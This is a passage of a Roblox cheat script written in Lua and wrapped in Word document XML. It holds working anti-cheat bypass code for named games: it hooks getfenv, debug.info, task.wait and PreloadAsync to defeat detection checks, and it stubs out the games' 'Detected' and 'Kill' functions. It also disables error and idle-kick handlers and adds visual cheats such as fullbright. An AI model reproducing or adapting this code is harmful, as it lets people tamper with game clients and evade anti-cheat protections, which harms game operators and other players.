      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if BlacklistedAssets[AssetId] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- The game is doing a sanity check where it intentionally loads a blacklisted asset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- to see if the executor is blocking it. We need to remove it from the blacklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- so it doesn't get blocked.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>BlacklistedAssets[AssetId] = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Key == "CanCollide" and (not checkcaller()) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Name = debug.info(3, "n")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Name and Name:match("Obfuscated") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return coroutine.yield()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldNewIndex(Self, Key, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>-- Now that we will proxy and record all assets the executor uses, we can load the hook.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local OldPreloadAsync</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldPreloadAsync = shared.SafeHook(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>ContentProvider.PreloadAsync,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>function(Self, Assets, OriginalCallback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Self ~= ContentProvider or type(Assets) ~= "table" or type(OriginalCallback) ~= "function" then --note: callback can be nil but in that case it's useless anyways</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldPreloadAsync(Self, Assets, OriginalCallback)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--check for any errors that I might've missed (such as table being {[2] = "something"} which causes "Unable to cast to Array")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local err</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>task.spawn(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>function() --TIL calling a C yield function inside a C yield function is a bad idea ("cannot resume non-suspended coroutine")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local s, e = pcall(OldPreloadAsync, Self, Assets)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not s and e then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>err = e</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if err then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldPreloadAsync(Self, Assets) --don't pass the callback, just in case</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Assets = FilterTable(Assets)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldPreloadAsync(Self, Assets, OriginalCallback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Sprint_Module = require(game:GetService("ReplicatedStorage").Modules.Game.Sprint)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Function_Table_UpValue = debug.getupvalue(Sprint_Module.loaded, 11)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local _getfenv; _getfenv = hookfunction(getrenv().getfenv, LPH_NO_VIRTUALIZE(function(level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if debug.traceback():find("validity_check") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return setmetatable({}, {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    __index = function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return _getfenv(level);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getgenv().Send_Remote = Function_Table_UpValue.send;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getgenv().AntiCheatBypass = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "Universal" or Game_Name == "Road To Riches" or Game_Name == "Street Life" or Game_Name == "The Bronx" or Game_Name == "Town" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local DTC;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in next, getgc(true) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(Value) == "table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Detected = rawget(Value, "Detected");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Kill = rawget(Value, "Kill");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if type(Detected) == "function" and not DTC then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        DTC = Detected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        hookfunction(Detected, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if rawget(Value, "Variables") and rawget(Value, "Process") and typeof(Kill) == "function" then          </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        hookfunction(Kill, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)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end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Old; Old = hookfunction(getrenv().debug.info, LPH_NO_UPVALUES(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local LevelOrFunc, Info = ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if DTC and LevelOrFunc == DTC then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return coroutine.yield(coroutine.running())</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return Old(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getgenv().AntiCheatBypass = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "South Bronx" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in getconnections(Services.ScriptContext.Error) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value:Disable()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in Services.ReplicatedStorage.Workspace.Homeless:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Value.Parent = Services.Workspace.Folders.HomelessPeople</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in Services.Workspace.Folders.HomelessPeople:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Value:GetPropertyChangedSignal('Parent'):Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value.Parent = Services.Workspace.Folders.HomelessPeople</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in Services.ReplicatedStorage.Workspace.NPCs:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Value.Parent = Services.Workspace.Folders.NPCs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in Services.Workspace.Folders.NPCs:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Value:GetPropertyChangedSignal('Parent'):Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value.Parent = Services.Workspace.Folders.NPCs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local task_wait_hook; task_wait_hook = hookfunction(task.wait, LPH_NO_UPVALUES(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local args = {...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local traceback = debug.traceback()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if args[1] == 2.5 and traceback:find("Loop") and traceback:find("NPCs") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return task_wait_hook (...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in getconnections(Services.Players.LocalPlayer.Idled) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Value["Disable"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value["Disable"](Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Value["Disconnect"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Value["Disconnect"](Value)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local get_nil_instance = LPH_JIT_MAX(function(name, class) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local found = nil </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, instance in getnilinstances() do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local instanceName = instance.Name </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if class then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not instance:IsA(class) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if instanceName:find(name) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        found = instance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if instanceName:find(name) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        found = instance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return found</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat task.wait() until get_nil_instance("Gun", "ModuleScript")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local gun_module = getsenv(get_nil_instance("Gun", "ModuleScript"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local old; old = hookfunction(gun_module.x, LPH_NO_UPVALUES(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --[[local Old; Old = hookmetamethod(game, "__index", LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Self, Index = ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Old(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Index ~= "CanCollide" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Old(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if typeof(Self) == "Instance" and Self.Name and Collide_Data[Self.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Collide_Data[Self.Name]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if typeof(Self) == "Instance" and Self.Name and Self.Name == "Table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return Old(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end))]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        getgenv().AntiCheatBypass = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    repeat Services.RunService.RenderStepped:Wait() until getgenv().AntiCheatBypass == true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local OldLightingSettings = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>OldLightingSettings["Brightness"] = Lighting.Brightness</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OldLightingSettings["ClockTime"] = Lighting.ClockTime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OldLightingSettings["FogEnd"] = Lighting.FogEnd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OldLightingSettings["GlobalShadows"] = Lighting.GlobalShadows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OldLightingSettings["OutdoorAmbient"] = Lighting.OutdoorAmbient</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local getnamecallmethod, hookmetamethod, hookfunction = (getnamecallmethod ~= nil) and clonefunction(getnamecallmethod) or function(...) end, (hookmetamethod ~= nil) and clonefunction(hookmetamethod) or function(...) end, (hookfunction ~= nil) and clonefunction(hookfunction) or function(...) end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        _fireproximityprompt = fireproximityprompt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Solara or not fireproximityprompt or string.find(identifyexecutor(), "MacSploit") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            getgenv().fireproximityprompt = LPH_NO_VIRTUALIZE(function(self, vuln)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local prompt_settings = {["HoldDuration"] = self.HoldDuration; ["RequiresLineOfSight"] = self.RequiresLineOfSight};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not vuln then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    self.HoldDuration = 0; self.RequiresLineOfSight = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    self:InputHoldBegin()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not (self.HoldDuration == 0) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(self.HoldDuration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    self:InputHoldEnd()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in prompt_settings do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        self[Index] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    self.HoldDuration = 0; self.RequiresLineOfSight = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    _fireproximityprompt(self)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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Tint = Instance.new("ColorCorrectionEffect", Lighting)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local OldSaturation = Lighting.ColorCorrection.Saturation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local OldFogColor = Lighting.FogColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Set_Fog, Set_Fov, Set_FullBright = false, false, false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RunService.PreRender:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Config.WorldVisuals.SaturationEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.ColorCorrection.Saturation = Config.WorldVisuals.Saturation_Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.ColorCorrection.Saturation = OldSaturation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Config.WorldVisuals.Fullbright then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Set_FullBright = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.Brightness = 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.ClockTime = 14</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.FogEnd = 100000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.GlobalShadows = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Set_FullBright then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_FullBright = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
